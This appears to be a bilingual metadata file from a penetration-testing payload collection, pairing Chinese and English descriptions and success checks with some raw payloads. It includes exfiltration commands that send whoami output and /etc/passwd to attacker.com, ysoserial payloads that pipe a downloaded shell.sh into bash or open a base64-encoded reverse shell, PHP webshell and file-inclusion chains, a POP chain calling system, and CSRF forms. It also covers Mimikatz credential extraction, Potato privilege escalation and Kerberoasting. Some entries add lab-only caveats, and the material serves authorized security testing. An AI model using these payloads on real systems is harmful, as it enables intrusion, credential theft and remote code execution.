description.en: Inject file, /proc, metadata, and loopback entity samples in SharedStrings form line by line; markers in parser logs or cell content confirm each target's reachability. Before execution replace every system path, loopback, and metadata address with an import-worker sandbox marker or isolated HTTP token.

description.en: Carry php://filter reads in a SharedStrings entity; the Base64 result decoding to the marker confirms the filter-read boundary. Never read the source system path — in an isolated PHP fixture change resource to a random marker file.

description.en: Submit bare data: and text/html/base64 forms line by line to probe navigation and embedding contexts; the browser rendering or navigating to the data: URI confirms the scheme-handling boundary, unlocking scripted payload follow-ups.

description.zh: 逐行以 javascript: URI 变体把页面导航到收集端；浏览器实际跳转至 {ATTACKER_HOST} 即确认对应 location 赋值形式可被 URI 触发。
description.en: Navigate the page to the collector with each javascript: URI variant; an actual jump to {ATTACKER_HOST} confirms that location-assignment form is triggerable from a URI.

description.zh: 在受控浏览器夹具中分别以 sendBeacon、导航与 Image 三种方式外发页面 cookie；收集端收到三种请求即确认页面数据出站通道成立。{ATTACKER_HOST} 渲染为隔离收集器，cookie 仅含随机测试值，三行逐一执行。
description.en: Exfiltrate page cookies in a controlled browser fixture via sendBeacon, navigation, and Image; all three requests reaching the collector confirm the page-data egress channel. {ATTACKER_HOST} renders to the isolated collector, cookies contain only random test values, and the three lines run separately.

description.zh: 以三种 Jinja2 对象图链触发反向 shell；{ATTACKER_IP}:{LPORT} 监听端收到回连会话即确认 SSTI 到进程执行链成立。仅在授权实验环境执行，监听地址与端口由变量渲染。
description.en: Trigger reverse shells through three Jinja2 object-graph chains; a callback session arriving at the {ATTACKER_IP}:{LPORT} listener confirms the SSTI-to-process-execution chain. Run only in an authorized lab — listener address and port render from variables.

description.zh: 逐行提交引号、注释符与恒真闭合变体并记录响应；某行触发数据库错误或真/假对照出现稳定响应差异即确认对应闭合上下文可注入。
description.en: Submit quote, comment, and tautology closure variants line by line and record responses; any line raising a database error or producing a stable true/false differential confirms that closure context is injectable.

description.zh: 用动态属性调用、函数名拼接与 Base64 还原 assert 构造变形一句话。命中判据：传入 cmd 后同样返回命令输出。
description.en: Builds obfuscated one-line webshells with dynamic property calls, concatenated names, and Base64-restored assert. Success check: passing cmd likewise returns command output.

description.zh: 经 array_map、call_user_func 与变量函数间接调用 assert。命中判据：cmd 参数传入后返回命令输出。
description.en: Invokes assert indirectly via array_map, call_user_func, and variable functions. Success check: passing cmd returns command output.

description.zh: 由 GET 参数 func 与 cmd 决定动态调用。命中判据：func=assert&cmd=id 时响应包含 uid=…。
description.en: Lets GET parameters func and cmd drive the dynamic call. Success check: func=assert&cmd=id yields uid=... in the response.

description.zh: 提交 iconv 与 base64 组合的完整 php://filter 链作为包含参数。命中判据：包含执行后输出经链变换的可控内容（按链解码还原为种子 PHP 代码）。
description.en: Submits a full php://filter chain combining iconv and base64 as the inclusion parameter. Success check: inclusion emits chain-transformed controllable content that decodes back to the seed PHP code.

description.zh: 通过 nslookup/ping/host 把 whoami、id 输出编码进攻击者域名的子域查询，Windows 行使用 %USERNAME%。命中判据：攻击者 DNS 权威日志收到携带该输出的查询。
description.en: Encodes whoami/id output into subdomain queries to the attacker domain via nslookup/ping/host; the Windows line uses %USERNAME%. Success check: the attacker DNS authoritative log receives queries carrying that output.

patches.expectedCommand:
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id)
; curl -d @/etc/passwd http://attacker.com/
& certutil -urlcache -f http://attacker.com/?data=%USERNAME%
patches.command:
; curl http://{ATTACKER_HOST}/?data=$(whoami)
; wget http://{ATTACKER_HOST}/?data=$(id)
; curl -d @/etc/passwd http://{ATTACKER_HOST}/
& certutil -urlcache -f http://{ATTACKER_HOST}/?data=%USERNAME%

description.zh: 通过 curl/wget/certutil 把命令输出或文件内容外带到攻击者 HTTP 服务。命中判据：攻击者 HTTP 日志收到包含数据的外带请求。
description.en: Exfiltrates command output or file content to the attacker HTTP service via curl/wget/certutil. Success check: the attacker HTTP log receives requests containing the data.

patches.expectedCommand:
; ping -p $(echo "test" | xxd -p) attacker.com
; tcpdump -i eth0 icmp

description.zh: 注入 bash /dev/tcp、nc -e 与 python socket 反弹 Shell 连接授权监听器。命中判据：监听端接受连接并能执行 whoami 取得返回。
description.en: Injects bash /dev/tcp, nc -e, and python socket reverse shells toward an authorized listener. Success check: the listener accepts the connection and whoami returns output.

description.zh: 将反弹 Shell 命令 Base64 编码后经 echo|base64 -d|bash 解码执行，验证绕过对明文反弹命令关键字的过滤。复制后需将 Base64 解码内容中的回连 IP 与端口改为自有监听地址并重新编码。命中判据：过滤器放行该请求且监听器收到反弹连接。
description.en: Base64-encodes a reverse-shell command and runs it through echo|base64 -d|bash to bypass plaintext-keyword filtering. After copying, change the callback IP and port inside the Base64-decoded content to your own listener and re-encode. Success check: the filter lets the request pass and the listener receives the reverse connection.

description.zh: 以 CommonsCollections1 链生成执行 curl 下载并管道给 bash 的序列化载荷，验证 Java 反序列化点可触发命令执行。命中判据：攻击者 HTTP 日志收到目标对 shell.sh 的请求，或目标侧出现对应命令执行痕迹。
description.en: Generate a CommonsCollections1 serialized payload that pipes a downloaded script into bash, verifying the Java deserialization sink reaches command execution. Success check: the attacker HTTP log records the target fetching shell.sh, or the target shows the corresponding command-execution trace.

description.zh: 以 ObjectDataProvider gadget 配合 Json.Net 格式生成弹出 calc.exe 的 .NET 反序列化载荷，验证 Json.NET 反序列化点可触发执行。命中判据：目标主机出现计算器进程。
description.en: Generate a .NET deserialization payload that launches calc.exe with the ObjectDataProvider gadget in Json.Net format, verifying the Json.NET sink triggers execution. Success check: a calculator process appears on the target host.

patches.expectedCommand:
<?php
class Chain {
    public $obj;
    function __destruct() {
        $this->obj->action();
    }
}
class Action {
    public $cmd;
    function action() {
        system($this->cmd);
    }
}
$payload = new Chain();
$payload->obj = new Action();
$payload->obj->cmd = "whoami";
echo serialize($payload);
?>

description.zh: 构造 Chain.__destruct 调用 Action.action 再触发 system 的两级 POP 链并输出其序列化串。命中判据：反序列化点还原对象链后返回 whoami 的当前用户名。
description.en: Builds a two-level POP chain where Chain.__destruct calls Action.action which triggers system, and prints its serialized form. Success check: after the deserialization sink restores the object chain, whoami returns the current username.

java -jar ysoserial.jar
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash" > payload.ser
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}"

java -jar ysoserial.jar CommonsCollections1 "curl {ATTACKER_HOST}/shell.sh|bash" > payload.ser
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}"

description.zh: 用 CommonsCollections1/6 链分别生成下载执行脚本与 base64 反弹 Shell 的序列化载荷，并落盘为 payload.ser 供投递。第二行 Base64 内嵌回连地址，使用前需改为自有监听地址并重新编码。命中判据：目标反序列化后攻击者 HTTP 日志出现 shell.sh 请求或监听器收到反弹连接。
description.en: Use the CommonsCollections1/6 chains to generate payloads that download-execute a script or spawn a base64-obfuscated reverse shell, saved as payload.ser for delivery.The second line's Base64 embeds the callback address; change it to your own listener and re-encode before use. Success check: after deserialization the attacker HTTP log records the shell.sh fetch or the listener receives the reverse connection.

java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections1 "touch /tmp/pwned"
java -jar ysoserial.jar JRMPClient attacker:4444
patches.command:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener {LPORT} CommonsCollections1 "touch /tmp/pwned"
java -jar ysoserial.jar JRMPClient {ATTACKER_HOST}:{LPORT}

description.zh: 在攻击者侧启动 ysoserial JRMPListener 等待回连，并生成让目标反序列化后连接攻击者 JRMP 端口的 JRMPClient 载荷。命中判据：JRMPListener 控制台打印目标回连并完成交互。
description.en: Start a ysoserial JRMPListener on the attacker side and generate a JRMPClient payload that makes the target connect back to the JRMP port after deserialization. Success check: the JRMPListener console prints the target's connection and completes the interaction.

description.zh: 包含 sess_[PHPSESSID] 会话文件让其中注入的 PHP 代码执行，验证会话存储路径可控时的包含执行。命中判据：携带 cmd=whoami 包含会话文件后响应输出当前用户名。
description.en: Include the sess_[PHPSESSID] session file so injected PHP code runs, verifying inclusion-based execution via session storage. Success check: including the session file with cmd=whoami prints the current username.

description.zh: 让 file 参数加载攻击者服务器上的 shell.txt 并执行其中 PHP 代码，验证 allow_url_include 开启时的远程包含。命中判据：攻击者 HTTP 日志出现 shell.txt 请求且响应包含命令输出。
description.en: Have the file parameter load shell.txt from the attacker server and run its PHP code, verifying RFI when allow_url_include is on. Success check: the attacker HTTP log records the shell.txt request and the response contains command output.

description.zh: 在 User-Agent 中植入 PHP 代码后包含 Apache/Nginx 访问日志，验证被记录进日志的代码在包含时执行。命中判据：携带 cmd=whoami 包含日志后响应输出当前用户名。
description.en: Plant PHP code in the User-Agent, then include the Apache/Nginx access log, verifying logged code executes on inclusion. Success check: including the log with cmd=whoami prints the current username.

description.zh: 把 PHP 代码放入 User-Agent 后包含 /proc/self/environ，验证随请求注入的环境变量在包含时执行。命中判据：包含 /proc/self/environ 后响应输出当前用户名。
description.en: Place PHP code in the User-Agent and include /proc/self/environ, verifying request-injected environment variables execute on inclusion. Success check: including /proc/self/environ prints the current username.

description.zh: 以 php://input 原始输入流与 data:// 文本/base64 内联流作为包含目标，验证请求体和内联数据可直接按 PHP 执行。命中判据：php://input 请求体或 data:// 内联流被包含执行后输出 whoami 的当前用户名。
description.en: Use the php://input raw stream and data:// text/base64 inline streams as inclusion targets, verifying request bodies and inline data run as PHP. Success check: after the php://input body or data:// inline stream is included and executed, whoami prints the current username.

description.zh: 以百分号编码形式传递日志包含路径，验证仅匹配明文 /var/log 路径的过滤规则可被编码绕过。命中判据：编码形式返回与明文路径相同的日志内容。
description.en: Pass the log-inclusion path percent-encoded, verifying filters matching only the plaintext /var/log path can be evaded. Success check: the encoded form returns the same log content as the plaintext path.

description.zh: 以带 PHP eval 标记的 User-Agent 请求目标使其写入访问日志，再经文件包含参数加载该日志并传入 cmd 参数验证代码执行。命中判据：包含日志并传入 cmd=whoami 后响应输出当前用户名。
description.en: Send a PHP-tagged User-Agent that is written to the access log, then include the log through the file parameter and pass a cmd parameter to verify execution. Success check: including the log with cmd=whoami prints the current username.

description.zh: 对 Nginx 访问日志路径重复同一包含流程，确认不同服务器日志布局下的包含可达性。命中判据：Nginx 日志包含后同样返回命令输出。
description.en: Repeat the same inclusion flow against the Nginx access log path to confirm reachability across server log layouts. Success check: including the Nginx log likewise returns command output.

description.zh: 在 Apache 配置 AddType application/x-httpd-php .jpg 后访问上传目录中的 shell.jpg，验证扩展名黑名单可被 MIME 映射绕过。命中判据：shell.jpg 按 PHP 执行并返回命令输出。
description.en: Map .jpg to the PHP handler with AddType in the Apache config and request the uploaded shell.jpg, verifying extension blacklists are bypassed by MIME mapping. Success check: shell.jpg is executed as PHP and returns command output.

description.zh: 经文件包含参数与 phar:// 流访问已上传的 shell.jpg，验证图片内 PHP 代码或元数据在包含/解析时执行。命中判据：包含 shell.jpg 后传入 cmd=whoami 返回当前用户名。
description.en: Reach the uploaded shell.jpg through an inclusion parameter and the phar:// stream, verifying embedded PHP code or metadata executes on inclusion or parsing. Success check: including shell.jpg with cmd=whoami returns the current username.

description.zh: 以 input、invokefunction 与 Template write 三条路由执行 system 命令或写入 shell.php。命中判据：id 返回 uid=… 或 shell.php 写入成功且可访问。
description.en: Uses the input, invokefunction, and Template write routes to run system commands or drop shell.php. Success check: id returns uid=... or shell.php is written and reachable.

description.en: These two lines are standalone archive-wrapper references. Success check: the archive member's content is read through the reference path.

description.zh: 该块保留 BASE 以及驱动器、反斜杠和短文件名变体。命中判据：短文件名或反斜杠变体返回 PAYLOADER_MARKER 文本。
description.en: This chunk retains BASE plus drive, backslash, and short-name variants. Success check: the short-name or backslash variants return the PAYLOADER_MARKER text.

description.zh: 该请求复用受控入口的 BASE 变量并只指向 example.invalid。命中判据：响应返回 PAYLOADER_MARKER 文本或 UNC 解析日志记录对应查询。
description.en: This request reuses the controlled endpoint BASE variable and points only to example.invalid. Success check: the response returns the PAYLOADER_MARKER text, or the UNC resolution log records the query.

description.zh: 该块保留 BASE、MARKER、声明类型请求和读取验证。命中判据：HEAD 回读确认存储成功且声明类型被记录。
description.en: This chunk retains BASE, MARKER, the declared-type request, and retrieval verification. Success check: the HEAD read-back confirms storage and the declared type is recorded.

description.zh: 这些请求变体复用受控上传夹具中的 BASE 与 MARKER 变量。命中判据：不同 filename 变体产生不同的存储名与判定结果。
description.en: These request variants reuse BASE and MARKER from the controlled upload fixture. Success check: different filename variants produce different stored names and verdicts.

description.zh: Prototype Pollution (Node.js)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：新对象继承注入属性，或 execPath/execArgv 变体使子进程执行指定命令。
description.en: Prototype Pollution (Node.js) contains multiple reproducible input samples; test them individually and record response and log differences. Success check: fresh objects inherit the injected property, or the execPath/execArgv variants make a child process run the given command.

description.en: Python Pickle contains multiple reproducible input samples; test them individually and record response and log differences. Success check: after deserialization the response or side effects show the matching command output (id/whoami/pwd, and so on).

description.zh: Shellshock via curl (d4t4s3c)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：CGI 响应体出现 SHELLSHOCK_TEST_MARKER。
description.en: Shellshock via curl (d4t4s3c) contains multiple reproducible input samples; test them individually and record response and log differences. Success check: the CGI response body contains SHELLSHOCK_TEST_MARKER.

description.zh: 逐行替换为隔离标记文件后提交，记录原始 URI、规范路径、过滤器选择和响应；不得读取系统或业务文件。命中判据：响应为 Base64 串，解码后等于标记文件内容。
description.en: Submit one line at a time after substituting the isolated marker file, recording the raw URI, canonical path, selected filter, and response; never read system or business files. Success check: the response is Base64 that decodes to the marker file's content.

description.zh: 原字节仅用于追溯。实际测试重编码为只设置请求内随机标记的 PHP 片段，每次提交一条且不运行命令、不读取文件。命中判据：包含后页面输出标记字符串。
description.en: The original bytes are retained only for traceability. For testing, re-encode a PHP fragment that sets only a request-local random marker, submit one line at a time, and execute no command or file read. Success check: after inclusion the page prints the marker string.

description.zh: 原行保留用于来源核对。执行时统一替换为批准的 marker-helper，禁止运行 id、ls 或读取 /etc/passwd。命中判据：marker-helper 的随机标记出现在响应中。
description.en: The originals are retained for source traceability. Replace every command with the approved marker-helper during execution; do not run id, ls, or read /etc/passwd. Success check: the marker-helper's random marker appears in the response.

description.zh: Null字节绕过(老版本PHP)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：老版本 PHP 下 %00 截断读取到目标文件，新版本返回拼接路径错误。
description.en: Run this Legacy PHP File-Path Null-Byte Truncation validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Success check: on legacy PHP the %00 truncation reads the target file, while modern versions error on the concatenated path.

description.zh: LFI结合文件上传(ZIP)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：归档成员被包含执行后返回 cmd=id 的 uid=… 输出。
description.en: LFI + File Upload (ZIP) contains multiple reproducible input samples; test them individually and record response and log differences. Success check: after the archive member is included and executed, cmd=id returns uid=... output.

description.zh: 逐条替换目标路径参数，并把系统文件改为隔离标记；记录每个代理、框架和文件 API 看到的解码值。命中判据：某一编码变体在目标解码后返回标记文件内容。
description.en: Substitute each line into the path parameter, replace system files with an isolated marker, and record decoded values at every proxy, framework, and file API. Success check: one encoded variant decodes on the target and returns the marker file's content.

description.zh: 只选择与已确认操作系统和框架匹配的目标；优先改为同目录中的测试标记，真实文件仅用于授权后的最小元数据确认。命中判据：所选目标返回文件内容特征（如 hosts 的 localhost 行）或标记内容。
description.en: Select only targets matching the confirmed OS and framework; prefer same-directory test markers, using real files only for minimal metadata confirmation when explicitly authorized. Success check: the chosen target returns the file's content signature (such as the localhost line of hosts) or the marker content.

description.zh: 逐 wrapper、逐目标测试，并把系统文件、代码与归档全部替换为隔离的无害标记；data: 与 data:// 是不同解析路径。命中判据：各 wrapper 按预期返回 base64 源码或执行内联流内容。
description.en: Test one wrapper and target at a time and replace system files, code, and archives with harmless isolated markers; data: and data:// exercise different parsing paths. Success check: each wrapper returns Base64 source or executes the inline stream as expected.

description.zh: 逐文件名上传同一无害文本标记，记录入口校验名、规范存储名、响应 Content-Type 和是否落入可执行处理器。命中判据：同一内容在不同文件名下产生不同的存储名、Content-Type 与处理器路由。
description.en: Upload the same harmless text marker under each filename and record validated name, canonical stored name, response Content-Type, and whether an executable handler is selected. Success check: identical content under different filenames yields different stored names, Content-Types, and handler routing.

description.zh: 将 index.php 替换为隔离标记资源，按原顺序逐条执行并与离线预期字节比较；不得读取生产源码。命中判据：转换后字节与离线预期完全一致。
description.en: Replace index.php with the isolated marker resource, execute each line in source order, and compare bytes with offline expectations; never read production source. Success check: the transformed bytes match the offline expectation exactly.

description.zh: 用自建归档文件名和纯文本 marker.txt 替换原目标，一次测试一个成员路径；不要包含 PHP 代码或反序列化元数据。命中判据：成员路径返回 marker.txt 的文本内容。
description.en: Replace the originals with a controlled archive name and plaintext marker.txt, testing one member path at a time; include no PHP code or deserialization metadata. Success check: the member path returns marker.txt's text content.

description.zh: 按目标操作系统把末端文件替换为根目录外的随机标记；逐行提交并记录每层解码。%00 仅作为版本相关负对照，不预设可截断。命中判据：某一变体解析后返回根目录外的标记内容。
description.en: For the target operating system replace the terminal file with the random marker outside the root, submit one line at a time, and record every decode layer. Treat %00 only as a version-dependent negative control, not an assumed truncation. Success check: one variant resolves and returns the marker content outside the root.

description.zh: 原始内容不得直接执行。把三条分别重写为同一随机标记输出，用于比较明文与 Base64 传输差异。命中判据：重写后的 data 流被包含并输出同一随机标记。
description.en: Do not execute the original content. Rewrite all three forms to emit the same random marker and use them only to compare plaintext with Base64 transport. Success check: the rewritten data stream is included and prints the same random marker.

description.zh: 该危险原行只作来源记录；实际执行必须替换为 expect://marker-helper，并由进程策略保证仅输出随机标记。命中判据：marker-helper 的随机标记出现在响应中。
description.en: This dangerous original is retained only as a source record; actual execution must use expect://marker-helper, with process policy restricting it to random-marker output. Success check: the marker-helper's random marker appears in the response.

description.zh: 把子域与近邻域变体逐条置于 Origin；过宽白名单放行任一变体，即确认子域信任边界过宽。
description.en: Place each subdomain and neighbor-domain variant into Origin; an overly broad allowlist allowing any variant confirms an over-wide subdomain trust boundary.

description.zh: 把路径与头变体逐条替换到受保护端点请求；任一变体返回 200 或受保护内容而非 401/403，即确认该访问控制绕过有效。
description.en: Substitute each path or header variant into the protected-endpoint request; any variant returning 200 or protected content instead of 401/403 confirms that access-control bypass.

description.zh: 对边界设备复测同一组变体；边界与后端判定不一致即确认边界规则可被差异化利用。
description.en: Replay the same variants against the edge device; disagreement between edge and backend verdicts confirms differential abuse of edge rules.

description.zh: 逐条请求用户端点变体；任一路径返回有效用户数据或差异化错误，即确认 API 用户枚举面。
description.en: Request each user-endpoint variant; any path returning valid user data or differentiated errors confirms the API user-enumeration surface.

description.en: Decode and submit each reversible Base64 token; the server accepting the decoded identity values confirms encoding without encryption.

description.zh: 提交目标域前缀、连字符与拼接正则绕过域；任一域通过 Origin 校验，即确认正则边界缺陷。
description.en: Submit the prefix, hyphenated, and concatenated regex-bypass domains; any domain passing Origin validation confirms the regex-boundary flaw.

description.zh: 复测三条正则绕过域；放行结果与正样例一致即确认该绕过在边界同样成立。
description.en: Replay the three regex-bypass domains; the same allowance as the positive samples confirms the bypass holds at the boundary.

description.zh: 把携带会话参数的 Referer 逐条注入外发请求；服务端从 Referer 解析会话标识，即确认 Referer 会话泄露路径。
description.en: Inject each session-bearing Referer into outbound requests; the server parsing the session identifier from the Referer confirms the Referer session-leak path.

description.zh: 把会话参数逐条附加到 URL；服务端从 URL 接受会话标识，即确认 URL 传参的会话暴露面。
description.en: Append each session parameter to the URL; the server accepting the session identifier from the URL confirms the URL-based session exposure.

description.zh: 用资源标签逐条触发 GET 状态变更端点；目标端点在无交互下携带会话执行变更，即确认 GET 型 CSRF 可行。
description.en: Trigger the state-changing GET endpoints via resource tags one by one; the endpoint executing the change with ambient credentials and no interaction confirms GET-based CSRF.

description.zh: 逐条提交用户存在性查询；存在与不存在用户的响应结构差异即确认 GraphQL 用户枚举。
description.en: Submit each existence query; response-shape differences between existing and missing users confirm GraphQL user enumeration.

description.zh: 把 none 算法令牌与弱密钥逐条对照测试；任一路径接受伪造令牌，即确认 JWT 验证边界缺陷。
description.en: Test the none-algorithm tokens and weak secrets as controls; any path accepting a forged token confirms JWT validation-boundary flaws.

description.zh: 把 kid 路径与注入变体逐条置于头部提交；服务端按注入的 kid 查找并接受令牌，即确认密钥选择可操纵。
description.en: Submit each kid path or injection variant in the header; the server resolving the injected kid and accepting the token confirms manipulable key selection.

description.zh: 注入 X-Forwarded-Host 未键入头并观察响应；响应中的生成链接或重定向指向注入域名，且缓存键未纳入该头，即确认未键入头注入点。
description.en: Inject the unkeyed X-Forwarded-Host header and observe the response; generated links or redirects pointing at the injected domain while the cache key ignores the header confirms an unkeyed injection point.

patches.expectedCommand:
GET /?q=test HTTP/1.1

description.zh: 发送携带注入头的原始请求并观察缓存行为；投毒响应被缓存后，不带该头的后续请求返回指向注入域的内容，即确认缓存投毒。
description.en: Send the raw request with the injected header and watch caching; if the poisoned response is cached and later requests without the header receive injected-domain content, cache poisoning is confirmed.

patches.expectedCommand:
GET / HTTP/1.1
Host: target.com
Content-Length: 10

q=poisoned

description.zh: 发送 Fat GET 请求观察正文是否参与缓存；后续对同 URL 的普通 GET 返回 q=poisoned 正文，即确认 Fat GET 投毒。
description.en: Send the Fat GET and check whether the body participates in caching; later plain GETs to the same URL returning the q=poisoned body confirm Fat GET poisoning.

description.zh: 查看系统计划任务；root 运行且路径可写的任务即锁定 cron 提权候选。
description.en: Review system cron jobs; root-run jobs with writable paths pin cron escalation candidates.

description.zh: 检查任务脚本权限；普通用户对脚本或其父目录具备写权限即确认可注入执行。
description.en: Check task-script permissions; normal-user write access to the script or its directory confirms injectable execution.

<!doctype html>
<meta charset="utf-8">
<form action="http://127.0.0.1:18080/lab/csrf/profile-email" method="post">
  <input type="hidden" name="email" value="csrf-a1@lab.invalid">

description.zh: 构造自动提交的 CSRF 表单并指向目标状态变更端点；表单加载即自动提交，目标端点收到携带会话 Cookie 的 POST 且合成 email/marker 发生变化，即确认该请求形状可被跨站伪造。
description.en: Build an auto-submitting CSRF form pointing at the target state-changing endpoint; if submission fires on load and the endpoint receives the POST with ambient cookies and the synthetic email/marker changes, cross-site forgery of this request shape is confirmed.

description.zh: 用 img 标签触发 GET 状态变更请求；服务端日志显示该 GET 携带会话 Cookie 并改变合成状态，即确认 GET 型 CSRF。
description.en: Trigger a state-changing GET via an img tag; if the server log shows the GET carried the session cookie and changed synthetic state, GET-based CSRF is confirmed.

patches.expectedCommand:
<script>
fetch("http://127.0.0.1:18080/lab/csrf/json-compatible", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({marker: "CSRF_TEXT_C3"})
}).then(response => document.body.dataset.status = String(response.status));
</script>

description.zh: 以 text/plain 的 Fetch 发送 JSON 语义请求体；服务端把它当作 JSON 解析并接受状态变更，即确认简单请求绕过内容类型限制。
description.en: Send a JSON-semantic body as text/plain via fetch; if the server parses it as JSON and accepts the state change, the simple-request content-type bypass is confirmed.

description.zh: 诱导点击链接触发顶级导航 GET；目标端点在导航中携带会话并改变合成状态，即确认链接型 CSRF。
description.en: Lure a click on the link to trigger a top-level navigation GET; if the endpoint receives ambient credentials during navigation and the synthetic state changes, link-based CSRF is confirmed.

description.en: Submit the control form without a CSRF token; if the token-less request is accepted and state changes, token validation is not enforced.

description.zh: 循环提交三个构造 Referer 的请求并输出判定；任一变体返回 allowed=true，即确认 Referer 正则匹配存在绕过。
description.en: Submit three crafted Referer values in a loop and print each verdict; any variant returning allowed=true confirms a regex-matching bypass.

description.zh: 以 no-referrer 表单提交空 Referer 请求；allowed 为 true 且 marker 被接受，即确认空 Referer 绕过成立。
description.en: Submit the no-referrer form; an allowed=true verdict with the marker accepted confirms the empty-Referer bypass.

description.zh: 以 nip.io 子域构造含目标主机前缀的 Referer；服务端放行该请求即确认子域匹配过宽。
description.en: Craft a Referer that prefixes the target host via a nip.io subdomain; if the server allows the request, subdomain matching is too loose.

description.zh: 以 origin 策略页面触发带 Referer 的导航；目标端点接受该来源的请求即确认仅依赖来源头的校验可被操纵。
description.en: Trigger navigation with a Referer under the origin policy; if the endpoint accepts the request based on that source, Referer-only validation is manipulable.

description.zh: 在 sandbox iframe 内以 no-referrer 提交；帧内请求被接受且 marker 变更，即确认 iframe 嵌入可绕过来源校验。
description.en: Submit with no-referrer inside a sandboxed iframe; acceptance of the framed request with the marker changed confirms iframe-based bypass.

description.zh: 提交完全缺失 Referer 的对照请求；jq 输出 allowed=true 即确认来源校验未强制缺失拒绝。
description.en: Submit the control request with the Referer entirely absent; jq printing allowed=true confirms missing-Referer rejection is not enforced.

description.zh: 把生成的 DLL 复制到目标目录；copy 无报错且目标路径存在该文件，即确认目录可写、劫持可落地。
description.en: Copy the generated DLL into the target directory; a silent copy with the file present at the destination confirms a writable directory where hijacking lands.

description.zh: 枚举用户 Credentials 目录；列出受 DPAPI 保护的 blob 文件即定位完成。
description.en: Enumerate the user Credentials directory; listing DPAPI-protected blob files completes locating.

description.zh: 用 sekurlsa::dpapi 从内存提取 master key；输出主密钥与关联 GUID 即可用于离线解密 blob。
description.en: Extract master keys from memory with sekurlsa::dpapi; printed master keys with GUIDs enable offline blob decryption.

description.zh: 运行 GodPotato；-cmd 指定命令以 SYSTEM 执行即确认提权成功。

description.zh: 查找 SYSVOL 中的 XML 文件；输出组策略 XML 路径清单即定位完成，可交由 cpassword 解密步骤。
description.en: Locate XML files in SYSVOL; the printed list of Group Policy XML paths completes locating for the cpassword decryption step.

description.zh: 用 PowerView Get-NetGPPPassword 提取；输出包含用户名与明文口令即确认 GPP 口令遗留。
description.en: Extract with PowerView Get-NetGPPPassword; output containing usernames and plaintext passwords confirms legacy GPP passwords.

description.zh: 把路径变换变体逐条替换进管理路径请求；任一变体绕过 401/403 拿到管理响应，即确认路径规范化绕过。
description.en: Substitute each path-transformation variant into the admin-path request; any variant bypassing 401/403 for admin responses confirms path-normalization bypass.

description.en: Inject each invalid-host and template-expression variant into X-Forwarded-Host; error responses persistently cached and shared confirm cache-based denial of service.

description.zh: 把连续反斜杠目标逐条置于跳转参数；任一变体被解析为外部 authority 并跳转，即确认反斜杠阶梯解析差异。
description.en: Place each consecutive-backslash destination into the redirect parameter; any variant parsed as an external authority with a redirect confirms backslash-ladder parsing differences.

description.zh: 把类型混淆凭据逐条提交登录端点；宽松比较导致认证通过，即确认弱类型凭据比较漏洞。
description.en: Submit each type-confused credential to the login endpoint; authentication passing under loose comparison confirms the weak-typing flaw.

description.zh: 把百分号编码目标逐条提交；解码后仍跳转到外部域，即确认编码规范化绕过。
description.en: Submit each percent-encoded destination; redirects to the external domain after decoding confirm the encoding-normalization bypass.

description.zh: 把双重编码目标逐条提交；二次解码后仍跳转，即确认双重解码差异可利用。
description.en: Submit each double-encoded destination; redirects after the second decoding confirm exploitable double-decoding differences.

description.zh: 以认证会话请求静态后缀路径，再匿名重复请求；匿名请求取回私有内容，即确认缓存欺骗。
description.en: Request the static-suffixed paths with an authenticated session, then repeat anonymously; anonymous retrieval of private content confirms web cache deception.

description.zh: 检查当前令牌特权；whoami /priv 输出包含 SeImpersonatePrivilege 即满足 Potato 提权前提。
description.en: Check current token privileges; SeImpersonatePrivilege present in whoami /priv output satisfies the Potato prerequisite.

description.zh: 运行 JuicyPotato；绑定命令以 SYSTEM 执行即确认提权成功。
description.en: Run JuicyPotato; the bound command executing as SYSTEM confirms elevation.

description.zh: 全盘搜索 .kdbx 数据库；输出数据库路径清单即定位完成。
description.en: Search the disk for .kdbx databases; the printed path list completes locating.

description.zh: 用 Mimikatz 导出 Kerberos 票据；当前目录生成 .kirbi 票据文件即导出成功，可交离线破解。
description.en: Export Kerberos tickets with Mimikatz; .kirbi ticket files in the current directory mean the export succeeded for offline cracking.

description.zh: 用 Rubeus /stats 统计可请求票据的账号与加密类型；输出列出带 SPN 的账号即确认 Kerberoast 暴露面。
description.en: Run Rubeus /stats to profile ticket-requestable accounts and encryption types; output listing SPN-bearing accounts confirms the Kerberoast exposure.

description.zh: 用 Hashcat -m 13100 离线破解导出的票据；跑出明文口令即确认服务账号弱口令。
description.en: Crack the exported tickets offline with hashcat -m 13100; recovering a plaintext password confirms a weak service-account credential.

description.zh: 发起 SSH 连接；出现认证提示或直接进入 shell 即确认 22 端口可达。
description.en: Initiate the SSH connection; an auth prompt or direct shell confirms port 22 reachability.

description.zh: 以私钥认证连接；免密进入目标 shell 即确认密钥授权可用。
description.en: Connect with key authentication; password-less entry to the target shell confirms the key grant works.

description.zh: 经跳板机连接目标；通过跳板进入目标 shell 即确认跳板链路可用。
description.en: Connect through the jump host; entering the target shell via the jump chain confirms the pivot path works.

description.zh: 建立 PowerShell 远程会话；进入交互提示符且远程命令可执行，即确认 WinRM 可达与凭据有效。
description.en: Open a PowerShell remote session; an interactive prompt with executable remote commands confirms WinRM reachability and valid credentials.

description.zh: 远程执行 whoami；返回目标主机上的账户身份即确认远程命令执行可用。
description.en: Run whoami remotely; the returned target-host account identity confirms remote command execution.

description.zh: 用 evil-winrm 连接目标；获得交互 shell 即确认 5985/5986 端口与凭据可用。
description.en: Connect with evil-winrm; an interactive shell confirms the 5985/5986 endpoint and credentials work.

description.zh: 用 winrs 远程执行 whoami；返回目标账户身份即确认 WinRM 远程执行可用。
description.en: Run whoami via winrs; the returned target account confirms WinRM remote execution.

